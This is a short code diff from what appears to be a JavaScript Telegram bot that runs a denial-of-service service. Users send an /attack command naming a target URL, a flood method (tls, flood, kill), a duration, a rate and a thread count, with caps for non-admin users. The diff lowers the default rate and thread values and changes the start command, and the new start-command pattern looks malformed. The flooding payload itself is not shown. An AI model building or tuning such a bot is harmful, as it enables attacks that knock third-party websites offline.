@@ -33,7 +33,7 @@ function syncSlotsFromDb() {
   setSetting.run('activeSlots', activeSlots.toString());
 }
 syncSlotsFromDb();
-bot.onText(/\/スタート/, (msg) => {
+bot.onText(/\start/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
@@ -121,11 +121,11 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
   const url = match[1];
   const method = match[2];
   let time = parseInt(match[3]);
-  let rate = match[4] ? parseInt(match[4]) : 36;
-  let threads = match[5] ? parseInt(match[5]) : 6;
+  let rate = match[4] ? parseInt(match[4]) : 17;
+  let threads = match[5] ? parseInt(match[5]) : 5;
   if (!admins.includes(userId)) {
-    rate = 36;
-    threads = 6;
+    rate = 17;
+    threads = 5;
   }
   if (!methods.includes(method)) {
     bot.sendMessage(chatId, '🚫 Method không hợp lệ.', { parse_mode: "Markdown" });
